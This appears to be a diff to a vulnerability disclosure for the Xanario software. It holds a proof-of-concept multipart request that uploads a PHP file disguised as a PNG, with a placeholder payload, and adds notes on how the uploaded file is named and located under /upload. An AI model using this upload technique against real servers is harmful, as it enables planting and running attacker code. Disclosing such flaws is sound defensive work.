@@ -26,13 +26,18 @@ Content-Disposition: form-data; name="upload_1"
 
 bar
 ------WebKitFormBoundarymHYufpymkCWywEX5
-Content-Disposition: form-data; name="id[txt_bar]"; filename="1.php"
+Content-Disposition: form-data; name="id[txt_bar]"; filename="asdf.php"
 Content-Type: image/png
 
 <?php evilstuff..;?>
 ------WebKitFormBoundarymHYufpymkCWywEX5--
 ```
 
+The uploaded file will be available at `/upload` with a stripped down md5 based on *microtime*. e.g:
+```bash
+> ls upload
+b889c2a25_asdf.php
+```
 
 This disclosure marks the first installment in a series of identified vulnerabilities affecting Xanario. Users and administrators are strongly encouraged to evaluate safer alternatives and reconsider their reliance on this software.
 
